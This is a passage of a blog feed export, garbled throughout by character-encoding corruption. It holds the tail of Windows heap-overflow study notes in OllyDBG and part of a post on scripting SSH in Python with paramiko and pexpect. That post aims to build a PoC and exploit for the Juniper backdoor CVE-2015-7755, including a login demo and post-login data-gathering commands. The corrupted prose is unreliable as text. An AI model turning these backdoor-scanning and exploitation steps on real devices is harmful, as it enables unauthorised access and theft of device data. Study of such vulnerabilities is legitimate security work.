‚ÄúÂø´Ë°®ÁöÑ‰ΩøÁî®‚Äù‰∏ÄËäÇ‰∏≠ÊúâËæÉ‰∏∫ÊòéÊòæÁöÑÈîôËØØÔºåËÄåÂêéËøûÈîÅÂèçÂ∫îÂºèÂú∞Âú®Êú¨ËäÇ‰∏≠ÂºïÂèë‰∫Ü‰∏ÄËøû‰∏≤ÈîôËØØ„ÄÇ‰∏ÄÂºÄÂßãËøò‰∏çÊï¢Á°ÆÂÆöÔºåÂêéÊù•ÁªèËøáÂèçÂ§çË∞ÉËØïÂπ∂ÈòÖËØªÔºåÂü∫Êú¨Á°ÆÂÆöÈîôËØØÂ±ûÂÆûËÄåÈùûÁéØÂ¢É‰∏çÂêåÈÄ†ÊàêÁöÑÁªìÊûúÂ∑ÆÂºÇÔºå‰∏ãÊñáÂ∞ÜËØ¶Ëø∞‰πã„ÄÇ</strong></p><h4 id="ËßÇÂØüÂ†ÜË°®‰ø°ÊÅØ-1">(1) ËßÇÂØüÂ†ÜË°®‰ø°ÊÅØ</h4><p>0x178Â§ÑÂ≠òÂÇ®ÁöÑÂ∞æÂùóÊåáÈíà‰∏çÂÜçÊåáÂêë0x688ÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_2_1.png" class="" title="Âõæ1.2.1"><blockquote><p>ËøôÈáåÊèíÊí≠‰∏Ä‰∏™Âú®Â≠¶‰π†ËøáÁ®ã‰∏≠ÂèëÁé∞ÁöÑOllyDBG‰ΩøÁî®Â∞èTipsÔºå‰πãÂâçÊ≤°ÁúãËøáOllyDBGÁöÑ‰ΩøÁî®ÊñáÊ°£Ôºå‰∏Ä‰∫õÊúÄÂü∫Êú¨ÁöÑÊìç‰ΩúÈÉΩÊòØ‰ªé0day‰π¶‰∏≠Â≠¶‰π†Âà∞ÁöÑÔºåÂõ†Ê≠§Â∑≤ÁªèÁÜüÊÇâOllyDBG‰ΩøÁî®ÁöÑÂêåÂ≠¶ÂèØÂøΩÁï•ËøôÊù°Tips„ÄÇ</p><p>ËßÇÂØü‰∏äÂõæ‰∏≠0x178Â§ÑÊåáÈíàÊåáÂêëÁöÑÂ∞æÂùóÂú∞ÂùÄ0x00361E90ÔºåËã•Êàë‰ª¨ÊÉ≥Ë¶ÅË∑≥ËΩ¨Âà∞ËØ•Âú∞ÂùÄÂéªÊü•ÁúãÂ∞æÂùóÔºåÂèØ‰ª•ÊåâÁÖß0day‰π¶‰∏≠ÁöÑÊñπÊ≥ïÂú®‰∏äÂõæÁöÑÂÜÖÂ≠òÊü•ÁúãÁ™óÂè£‰∏≠Êåâ‰∏ãCtrl+GÔºåÁÑ∂ÂêéÈîÆÂÖ•361E90ÔºàÈªòËÆ§16ËøõÂà∂ÔºâÔºåÂ∞±ËÉΩÂ§üËΩ¨Âà∞ËØ•Âú∞ÂùÄÊü•ÁúãÂÜÖÂ≠ò„ÄÇ</p><p>Ê≠§Â§ñÔºåËøòÂèØ‰ª•Áî®Èº†Ê†áÂè≥ÈîÆÂçïÂáªÂÜÖÂ≠ò0x178Â§ÑÁöÑÂÄº0x90ÔºåÈÄâÊã©&quot;Follow DWORD in Dump&quot;ÔºåÂç≥ÂèØË∑≥ËΩ¨Âà∞ÂÜÖÂ≠ò0x00361E90Â§Ñ„ÄÇËøòÂèØ‰ª•ÈÄöËøáÂçïÂáª+Êàñ-‰ª•Êù•ÂõûÂàáÊç¢ÂâçÈù¢ÁöÑÊàñÂêéÈù¢ÁöÑÂÜÖÂ≠òÁ™óÂè£Êü•ÁúãÔºå‰ª•ÂÆûÁé∞0x178Âíå0x1E90Â§ÑÂÜÖÂ≠òÁöÑÂø´ÈÄüÊù•ÂõûÂàáÊç¢Êü•Áúã„ÄÇ</p></blockquote><p>0x688Â§ÑÂ∑≤ÁªèË¢´Âø´Ë°®ÊâÄÈú∏Âç†ÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_2_2.png" class="" title="Âõæ1.2.2"><blockquote><p>‰∏é‰∏äÂõæÂØπÂ∫îÁöÑ0day‰π¶‰∏≠Âõæ5.2.17Ê†áÊ≥®ÁöÑLookaside[0]‰Ωç‰∫é0x6b8Â§ÑËÄåÈùû0x688Â§ÑÔºå‰π¶‰∏≠ÁöÑÊ†áÊ≥®ÊúâËØØ„ÄÇ</p></blockquote><h4 id="ËßÇÂØüÂ†ÜÂùóÁöÑÂàÜÈÖç-1">(2) ËßÇÂØüÂ†ÜÂùóÁöÑÂàÜÈÖç</h4><p>Êé•ÁùÄÔºåÊàë‰ª¨Êù•ËßÇÂØüÂ†ÜÂùóÂàÜÈÖçÊìç‰ΩúÔºåËßÇÂØüh1Áî≥ËØ∑ÂêéÁöÑÂÜÖÂ≠òÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_2_3.png" class="" title="Âõæ1.2.3"><p>Ê≠§Êó∂0x178Â§ÑÁöÑÂ∞æÂùóÊåáÈíàÊåáÂêë0x1EA0ÔºåËØ¥ÊòéË∑ü‰∏äËäÇ‰∏≠ËÆ®ËÆ∫ÁöÑÁ©∫Ë°®ÂÜÖÂ≠òÁî≥ËØ∑‰∏ÄÊ†∑ÔºåÁî≥ËØ∑ËøáÁ®ã‰πüÊòØFreelist[0]ÊâÄÊåáÂêëÁöÑÂ∞æÂùó‰∏∫h1ËÖæÂá∫‰∫ÜÁ©∫Èó¥ÔºåÁªìÊûúË°®Áé∞‰∏∫Â∞æÂùóÁº©Â∞è 2 x 8 ByteÔºåÂÆÉÁöÑËµ∑ÂßãÈÉ®ÂàÜ‚ÄúÂêëÂêéÁßªÂä®‚Äù‰∫Ü„ÄÇ</p><p>Êé•ÁùÄÊâßË°å‰ª£Á†ÅÔºåÂÆåÊàêh1Ëá≥h4ÁöÑÂàÜÈÖçÔºåËßÇÂØüÊ≠§Êó∂ÂÜÖÂ≠òÊï∞ÊçÆÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_2_4.png" class="" title="Âõæ1.2.4"><h4 id="ËßÇÂØüÂ†ÜÂùóÁöÑÈáäÊîæ-1">(3) ËßÇÂØüÂ†ÜÂùóÁöÑÈáäÊîæ</h4><p>ÂÜçËßÇÂØüh1Ëá≥h4ÈáäÊîæÂêéÁöÑÂÜÖÂ≠òÊï∞ÊçÆÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_2_5.png" class="" title="Âõæ1.2.5"><p>ÂèØ‰ª•ÁúãÂà∞Ôºå‰∏éÁ©∫Ë°®‰∏≠‰∏çÂêåÁöÑÊòØÔºåÂú®ÈáäÊîæÂêéÂêÑÂùóÂùóÈ¶ñ‰∏≠‰ªéÂ∑¶Ëá≥Âè≥Á¨¨6 ByteÁöÑÊï∞ÊçÆÂπ∂Êú™ÊîπÂèòÔºå‰ªç‰∏∫0x01Âç≥BusyÁä∂ÊÄÅÔºåËØ•Ê†áËØÜÂèØ‰ª•‰øùËØÅÂç≥‰ΩøËØ•Â†ÜÂùóÁé∞Âú®Â∑≤Âèò‰∏∫Á©∫Èó≤Â†ÜÂùó‰πü‰∏ç‰ºöË¢´Á≥ªÁªüËá™Âä®ÂêàÂπ∂„ÄÇ</p><p>ÂÖ∂‰∏≠ÔºåË¢´ÈáäÊîæÂêéÁöÑh2‰∏≠Â§öÂá∫‰∫Ü‰∏Ä‰∏™ÊåáÈíàÔºåÂÖ≥‰∫éÂÖ∂Áî®ÈÄîÔºåÂæÖËßÇÂØü0x688Â§ÑÁöÑÂø´Ë°®Âç≥ÂèØÊòéÁôΩÔºåÂ¶Ç‰∏ãÂõæÔºö</p><img src="/tech/heap-overflow-learning-notes-1/1_2_6.png" class="" title="Âõæ1.2.6"><p>‰ªé‰∏äÂõæÂèØ‰ª•ÁúãÂá∫ÔºåË¢´ÈáäÊîæÂêéÁöÑÂêÑÂùóË¢´ÈìæÂÖ•Âø´Ë°®‰∏≠ÔºåÂΩ¢Êàê‰∫Ü3Êù°ÂçïÂêëÈìæË°®Ôºö</p><ul><li>Lookaside[2] -&gt; h2 -&gt; h1</li><li>Lookaside[3] -&gt; h3</li><li>Lookaside[4] -&gt; h4</li></ul><blockquote><p>0day‰π¶‰∏≠Âõæ5.2.20Ê†áÊ≥®ÁöÑLookaside[1], Lookaside[2], Lookaside[3]ÂàÜÂà´‰Ωç‰∫é0x6E8 0x718 0x748Ôºå‰π¶‰∏≠ÁöÑÊ†áÊ≥®ÊúâËØØ„ÄÇ</p></blockquote><p>ËøêË°å‰πãÂêéÁöÑ‰ª£Á†ÅÔºåC‰ª£Á†Å‰∏≠ÁöÑÊñ∞h2ÈúÄË¶Å16 ByteÁ©∫Èó¥ÔºåÂä†‰∏äÂùóÈ¶ñÔºåÈúÄÂç† (2+1) x 8 ByteÁ©∫Èó¥ÔºåÂõ†Ê≠§Âú®ÂàÜÈÖçÊó∂Â∑≤Ë¢´ÈìæÂÖ•Lookaside[3]ÁöÑ‰πãÂâçh3ÁöÑÂÜÖÂ≠ò0x1EB0Â∞ÜË¢´Êñ∞h2ÊâÄ‰ΩøÁî®Ôºå0x718Â§ÑÁöÑÊåáÈíàÂú®ÂàÜÈÖçÂÆåÊØïÂêéÂ∞ÜË¢´ÁΩÆ0ÔºåÂú®Êñ∞h2Ë¢´ÈáäÊîæÂêéËØ•Â§ÑÊåáÈíàÂèà‰ºöÊÅ¢Â§çÔºåÊï¥‰∏™ËøáÁ®ãËæÉ‰∏∫ÁÆÄÂçïÔºå‰∏çÂÜçËµòËø∞„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Learning Notes </tag>
            
            <tag> Bin </tag>
            
            <tag> Heap Overflow </tag>
            
            <tag> OllyDBG </tag>
            
            <tag> Security </tag>
            
            <tag> Windows </tag>
            
            <tag> Windows 2000 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonÂÆûÁé∞ÁªàÁ´Ø‰∫§‰∫í ‚Äî‚Äî ‰ª•JuniperÂêéÈó®CVE-2015-7755‰∏∫‰æãÔºà‰∫åÔºâ: SSHÁØá</title>
      <link href="/tech/shell-interaction-in-python-2-ssh/"/>
      <url>/tech/shell-interaction-in-python-2-ssh/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Shell Interaction in Python #2: SSH</strong></em></li><li>Author: dog2</li></ul><hr /><h3 id="ÈöæÁÇπ">ÈöæÁÇπ</h3><h4 id="Ê®°ÂùóÈÄâÊã©">1. Ê®°ÂùóÈÄâÊã©</h4><p>ÂØπ‰∫éSSH‰∫§‰∫íËÄåË®ÄÔºåÂæàÈöæ‰ª•Á∫ØsocketÂéªÂÆûÁé∞ÔºåÂõ†‰∏∫SSHÁöÑËÆ§ËØÅËøáÁ®ã‰∏≠Ê∂âÂèäÂà∞ÂêÑÁßçÁÆóÊ≥ïÔºåÂ∑•‰ΩúÈáèÂ§™Â§ßÔºåÂõ†Ê≠§ËÄÉËôë‰ΩøÁî®Â∑≤ÊúâÁöÑSSHÊ®°ÂùóÂÆûÁé∞„ÄÇ</p><h5 id="paramiko">(1) paramiko</h5><p>SSH‰∫§‰∫íÊúÄÂ∏∏Áî®ÁöÑÊòØÁ¨¨‰∏âÊñπÊ®°ÂùóÊòØparamikoÔºö</p><ul><li><span class="exturl" data-url="aHR0cDovL2RvY3MucGFyYW1pa28ub3JnLw==">ÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3RyZWUvbWFzdGVyL3BhcmFtaWtv">Ê∫êÁ†Å<i class="fa fa-external-link-alt"></i></span></li></ul><a id="more"></a><p>‰∏ãÈù¢ÁªôÂá∫‰ΩøÁî®paramikoËøõË°åsshÁôªÂΩïÁöÑ‰∏Ä‰∏™demo:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sshLogin</span><span class="params">(host, username, password, port=<span class="number">22</span>, timeout=<span class="number">5</span>)</span>:</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(</span><br><span class="line">            host,</span><br><span class="line">            username=username,</span><br><span class="line">            password=password,</span><br><span class="line">            timeout=timeout,</span><br><span class="line">            compress=<span class="literal">True</span>,</span><br><span class="line">            allow_agent=<span class="literal">False</span>,</span><br><span class="line">            look_for_keys=<span class="literal">False</span>,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.authenticated</span><br><span class="line">        <span class="keyword">print</span> ssh._transport.get_banner()</span><br><span class="line">        stdin, stdout, stderr = ssh.exec_command(<span class="string">'ls'</span>, bufsize=<span class="number">1024</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'... '</span> + line.strip(<span class="string">'\n'</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> paramiko.SSHException <span class="keyword">as</span> err:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><p>‰ª£Á†ÅËØ¥ÊòéÔºö</p><ul><li>17Ë°åÔºöÁî®‰∫éÂà§Êñ≠ÊòØÂê¶ÁôªÂΩïÊàêÂäü</li><li>18Ë°åÔºöÁî®‰∫éËæìÂá∫ssh bannerÔºåÂç≥ÁôªÂΩïÊàêÂäüÂêéÁöÑÊ¨¢ËøéÂ≠óÁ¨¶‰∏≤ÔºåÊØîÂ¶ÇÊàëÁöÑvpsÁôªÂΩïÊàêÂäüÂêéÊúâÂ¶Ç‰∏ãÊ¨¢ËøéÂ≠óÁ¨¶‰∏≤:</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Welcome to Ubuntu <span class="number">14.04</span><span class="number">.3</span> LTS (GNU/Linux <span class="number">3.13</span><span class="number">.0</span><span class="number">-68</span>-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https:<span class="comment">//help.ubuntu.com/</span></span><br><span class="line">Last login: Wed Dec <span class="number">30</span> <span class="number">01</span>:<span class="number">55</span>:<span class="number">57</span> <span class="number">2015</span> <span class="keyword">from</span> <span class="number">222.222</span><span class="number">.222</span><span class="number">.222</span></span><br><span class="line"><span class="symbol">root@</span>vultr:~# c</span><br></pre></td></tr></table></figure><p>‰ΩøÁî®Â¶Ç‰∏ädemoÂáΩÊï∞Â∞ùËØïÁôªÂΩïÊàëÁöÑvpsÔºåÊàêÂäüÁôªÂΩïÂπ∂ÊâìÂç∞‰∫ÜlsÂëΩ‰ª§ÁöÑËæìÂá∫„ÄÇ</p><p>‰ΩÜÊòØÂ≠òÂú®Â¶Ç‰∏ãÈóÆÈ¢òÔºö</p><ul><li>‰ΩøÁî®Â¶Ç‰∏ässhLoginÂáΩÊï∞ÁôªÂΩïjuniperËÆæÂ§áÔºå‰ª£Á†ÅËøêË°åÂà∞17Ë°åÊó∂ËæìÂá∫‰∏∫TrueÔºåËØ¥ÊòéÊàêÂäüÁôªÂΩï‰∫ÜÔºå‰ΩÜÂΩìÊâßË°åÂà∞Á¨¨19Ë°åÊó∂Ôºå‰ºöÂá∫Áé∞Â¶Ç‰∏ãÈîôËØØÔºö</li></ul><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/client.py"</span>, <span class="keyword">line</span> 405, <span class="keyword">in</span> exec_command</span><br><span class="line">    chan.exec_command(command)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 60, <span class="keyword">in</span> _check</span><br><span class="line">    <span class="keyword">return</span> func(self, *<span class="keyword">args</span>, **kwds)</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 229, <span class="keyword">in</span> exec_command</span><br><span class="line">    self._wait_for_event()</span><br><span class="line">  <span class="keyword">File</span> <span class="string">"/usr/local/lib/python2.7/site-packages/paramiko/channel.py"</span>, <span class="keyword">line</span> 1086, <span class="keyword">in</span> _wait_for_event</span><br><span class="line">    raise <span class="keyword">e</span></span><br><span class="line">paramiko.ssh_exception.SSHException: Channel closed.</span><br></pre></td></tr></table></figure><p>Ëøô‰ºöÂØºËá¥SSHËøûÊé•ÁöÑ‰∏≠Êñ≠ÔºåÂØºËá¥ËøôÁßçÂºÇÂ∏∏ÁöÑÂéüÂõ†ÔºåÂèØËÉΩÊòØjuniperËøôÁßçËÆæÂ§áÁöÑSSHÂÆûÁé∞ÊòØÈùûÊ†áÂáÜÁöÑÔºåËÄåparamikoÂØπËøô‰∫õÈùûÊ†áÂáÜSSHÊîØÊåÅ‰∏ç‰Ω≥ÊâÄËá¥ÔºåËÄå‰ΩøÁî®Unix/LinuxËá™Â∏¶ÁöÑSSHÂÆ¢Êà∑Á´ØÁ®ãÂ∫èÁôªÈôÜËøô‰∫õËÆæÂ§áÂ∞±Ê≤°ÊúâËøôÁßçÈóÆÈ¢ò„ÄÇÁúãÊù•paramikoÂπ∂‰∏çÊòØÂÆåÁæéÁöÑËß£ÂÜ≥ÊñπÊ°àÔºåÂ¶ÇÊûú‰ªÖ‰ªÖÈúÄË¶ÅÈ™åËØÅÊòØÂê¶ÁôªÈôÜÊàêÂäüÔºåÂÆÉËøòÊòØÂèØ‰ª•Êª°Ë∂≥ÁöÑ„ÄÇ</p><ul><li>Êó†ËÆ∫ÁõÆÊ†áÊòØÊàëÁöÑvpsËøòÊòØjuniperËÆæÂ§áÔºåÁ¨¨18Ë°åËæìÂá∫ÁöÑÈÉΩÊòØÁ©∫Â≠óÁ¨¶‰∏≤„ÄÇÂú®google‰∏äÁôæÂ∫¶‰∫Ü‰∏Ä‰∏ãÔºåÊúâ‰∫∫ÈÅáÂà∞Á±ª‰ººÈóÆÈ¢òÔºà<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL2lzc3Vlcy8yNzM=">#1<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BhcmFtaWtvL3BhcmFtaWtvL3B1bGwvNTg=">#2<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8yNTYwOTE1My9wYXJhbWlrby1lcnJvci1yZWFkaW5nLXNzaC1wcm90b2NvbC1iYW5uZXI=">#3<i class="fa fa-external-link-alt"></i></span>ÔºâÔºå‰πüÊúâ‰∫∫ÂÅö‰∫ÜËß£Á≠îÔºå‰ΩÜÂ§ßÈÉΩËøòÊòØËØ¥Ë∞ÉÁî®get_banner()ÂáΩÊï∞ÔºåÂπ∂‰∏çÊòØËß£ÂÜ≥ÂäûÊ≥ï„ÄÇÁåúÊµãËøôÂèØËÉΩÊòØparamikoËá™Ë∫´ÁöÑÈóÆÈ¢òÔºåÊ≤°ÊúâÊ∑±Á©∂ÔºåÂ¶ÇÊûúÊÇ®Áü•ÈÅìÂéüÂõ†ÂèäËß£ÂÜ≥ÂäûÊ≥ïÔºåËøòËØ∑ÊåáÊïô„ÄÇ</li></ul><h5 id="pexpect">(2) pexpect</h5><p>‰ªéFreebufÊñáÁ´† <span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS92dWxzLzkwODg2Lmh0bWw=">&quot;Âà©Áî®CensysÊâπÈáèËé∑ÂèñJuniper NetscreenÂêéÈó®&quot;<i class="fa fa-external-link-alt"></i></span> ‰∏≠‰∫ÜËß£Âà∞pexpectÂèØ‰ª•Áî®Êù•ÂÆûÁé∞SSH‰∫§‰∫íÔºå‰∫éÊòØÁÆÄÂçï‰∫ÜËß£‰∏ÄÁï™„ÄÇ</p><ul><li><span class="exturl" data-url="aHR0cDovL3BleHBlY3QucmVhZHRoZWRvY3Mub3JnLw==">ÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3BleHBlY3QvcGV4cGVjdC90cmVlL21hc3Rlci9wZXhwZWN0">Ê∫êÁ†Å<i class="fa fa-external-link-alt"></i></span></li><li>Áõ∏ÂÖ≥ËµÑÊñô:<ul><li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDEv">Êé¢Á¥¢ PexpectÔºåÁ¨¨ 1 ÈÉ®ÂàÜÔºöÂâñÊûê Pexpect<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">Êé¢Á¥¢ PexpectÔºåÁ¨¨ 2 ÈÉ®ÂàÜÔºöPexpect ÁöÑÂÆû‰æãÂàÜÊûê<i class="fa fa-external-link-alt"></i></span></li></ul></li></ul><p>FreebufÁöÑÊñáÁ´†‰∏≠ÊèêÂà∞‰∫ÜÁºñÂÜôPoCÈ™åËØÅËÆæÂ§áÊòØÂê¶ËøòÂ≠òÂú®ÊºèÊ¥ûÁöÑÊÄùË∑ØÔºö</p><blockquote><p>ÂÖ∂ÂÆûÁî±‰∫éÁôªÂΩïÂêéÂπ∂‰∏çÊòØ‰º†ÁªüÁöÑSSHÔºåËÄåÊòØËØ•Èò≤ÁÅ´Â¢ôÁöÑÊìç‰ΩúÁªàÁ´ØÔºåÂõ†Ê≠§pxssh‰ºöËÆ§‰∏∫Âπ∂Ê≤°ÊúâÁôªÂΩïÊàêÂäüÔºåËÄåÊòØËøîÂõûË∂ÖÊó∂ÂºÇÂ∏∏ÔºåÊ≠§Êó∂Êàë‰ª¨Ê£ÄÊµãÂÖ∂ËøîÂõûÁöÑbeforeÂ≠óÊÆµÂ¶ÇÊûúÊúâRemote Management ConsoleÂ≠óÊ†∑Â∞±ËØ¥ÊòéËØ•‰∏ªÊú∫Â≠òÂú®ÂêéÈó®„ÄÇ</p></blockquote><p>ÂÖ∂‰∏≠ÊèêÂà∞ÁöÑpxsshÊòØpexpect‰∏≠ÁöÑ‰∏Ä‰∏™Á±ªpexpect.pxssh.pxsshÔºåÁºñÂÜôSSH‰∫§‰∫íÁ®ãÂ∫èÈúÄË¶ÅÁî®Âà∞ÂÆÉÔºå‰ΩøÁî®Á§∫‰æãÂèÇËßÅ<span class="exturl" data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBMÁöÑÊñáÊ°£<i class="fa fa-external-link-alt"></i></span>„ÄÇ</p><p>Â∞ùËØï‰∫Ü‰∏ÄÁï™ÔºåpxsshÂÖ∂ÂÆûÊòØÂèØ‰ª•ÁôªÈôÜÊàêÂäüÁöÑÔºåÂπ∂Ê≤°ÊúâÊñáÁ´†‰∏≠ÊâÄËØ¥ÁöÑ &quot;ËøîÂõûÂºÇÂ∏∏&quot;„ÄÇ</p><p>ÂÖ∂ÂÆûpxsshÂ∫ïÂ±ÇÂÆûÁé∞ËøòÊòØ‰ª•ËøõÁ®ãÁöÑÊñπÂºèË∞ÉÁî®Unix/LinuxËá™Â∏¶ÁöÑSSHÂèØÊâßË°åÁ®ãÂ∫èÁöÑÔºåËÄåÊ≠£Â¶Ç‰∏äÈù¢ÊèêÂà∞ÁöÑËá™Â∏¶ÁöÑSSHÂÖºÂÆπÊÄßÂæàÂº∫ÔºåÂõ†Ê≠§‰ΩøÁî®pxsshÁºñÂÜôPoCÊòØ‰∏çÈîôÁöÑÈÄâÊã©„ÄÇ</p><p>‰ΩÜËã•Â∞ÜÁ®ãÂ∫èÁî®‰∫éÈ´òÂπ∂ÂèëÊâ´ÊèèÔºåÈúÄË¶ÅÊùÉË°°‰∏Ä‰∏ãÂπ∂ÂèëÊï∞‰∏éÊú∫Âô®ÊÄßËÉΩÔºåÂõ†‰∏∫ÊØèÊâ´Êèè‰∏Ä‰∏™ÁõÆÊ†áÂ∞±ÈúÄË¶ÅËøêË°å‰∏Ä‰∏™SSHÂÆ¢Êà∑Á´ØÁ®ãÂ∫èËøõÁ®ã„ÄÇ</p><h4 id="exp">2. Exp</h4><p>PoCÂèØ‰ª•ÁºñÂÜô‰∫ÜÔºåÊé•‰∏ãÊù•ÊòØExpÔºåÁõÆÊ†áËøòÊòØÊâßË°åÂ¶Ç‰∏ã2‰∏™ÂëΩ‰ª§Ôºö</p><ul><li><em><strong>get tech-support</strong></em> : ÂÆÉÁªºÂêà‰∫ÜÂ§ßÈÉ®ÂàÜgetÂ≠êÂëΩ‰ª§ÁöÑÁªìÊûú„ÄÇ</li><li><em><strong>get event</strong></em> : ÂåÖÂê´‰∫ÜËÆæÂ§áÊó•Âøó„ÄÇ</li></ul><p>SSH ExpÁöÑÈÄªËæë‰∏éTelnetÂá†‰πé‰∏ÄÊ†∑Ôºå‰ΩÜÊòØ pexpect.pxssh.pxssh Á±ª‰∏≠Âπ∂Ê≤°ÊúâÁ±ª‰ºº‰∫é telnetlib.Telnet Á±ª‰∏≠ÁöÑ read_until(expected[, timeout]) ËøôÁßçÂáΩÊï∞„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®ÂÆû‰æãÂáΩÊï∞ pxssh.sendline(cmd) Êù•ÂèëÈÄÅÂëΩ‰ª§ÔºåÂÖ∂‰∏≠cmd‰∏∫ÂëΩ‰ª§Â≠óÁ¨¶‰∏≤ÔºåÁªìÂ∞æ‰∏çÂøÖÂåÖÂê´ÔºåÂáΩÊï∞‰ºöÂú®ÂëΩ‰ª§ÁªìÂ∞æËá™Âä®Ê∑ªÂä†„ÄÇ</p><p>‰ΩÜ‰ΩøÁî®pxsshÁºñÂÜôExpÔºåËøòÊòØÂ≠òÂú®Â¶Ç‰∏ãÈóÆÈ¢òÔºö</p><ul><li>pxsshÈªòËÆ§Â∞Ü‰∏ä‰∏ÄÊ¨°ÂëΩ‰ª§ÊâßË°åÂêéËøîÂõûÁöÑÁªìÊûúÂ≠óÁ¨¶‰∏≤Â≠òÂÇ®Âú®ÂÆû‰æãÂèòÈáèpxssh.before‰∏≠Ôºå‰ΩÜÊòØÂú®Â§öÊ¨°Ëé∑ÂèñÁªìÊûúÂàÜÊÆµÊó∂ÔºåËøûÁª≠2Ê¨°Ëé∑ÂèñÁöÑÊ∂àÊÅØÂàÜÊÆµ‰ºöÊúâÈáçÂè†„ÄÇ</li><li>‰ªéÊ∫êÁ†ÅÂèØ‰ª•ÁúãÂà∞pxsshÁ±ªÁªßÊâøËá™pexpect.pyt_spawn.spawnÁ±ªÔºåËÄåspawnÁ±ªÂèàÁªßÊâøËá™pexpect.spawnbase.SpawnBaseÁ±ª„ÄÇÂú®SpawnBaseÁ±ª‰∏≠ÔºåÂ≠òÂú®Á±ªÂèòÈáèbufferÔºåÁî®‰∫éÊé•Êî∂ÊúçÂä°Âô®Á´ØÂèëÂõûÁöÑÊ∂àÊÅØ„ÄÇÂõ†Ê≠§Â∞ùËØïÁõ¥Êé•‰ΩøÁî®pxssh.bufferÂèòÈáèÊù•‰ª£ÊõøbeforeÂèòÈáèÔºåÂπ∂Âú®ÊØè‰∏ÄÊ¨°ÂèëÈÄÅÊñ∞ÁöÑÂëΩ‰ª§‰πãÂâçÔºåÂ∞Üpxssh.bufferÊ∏ÖÁ©∫Ôºå‰ΩÜÊòØÂèàÂá∫Áé∞‰∫ÜÁªìÊûú‰∏çÂÆåÊï¥ÁöÑÈóÆÈ¢ò„ÄÇ</li><li>ÂèØ‰ª•Â∞ùËØï‰ΩøÁî®<span class="exturl" 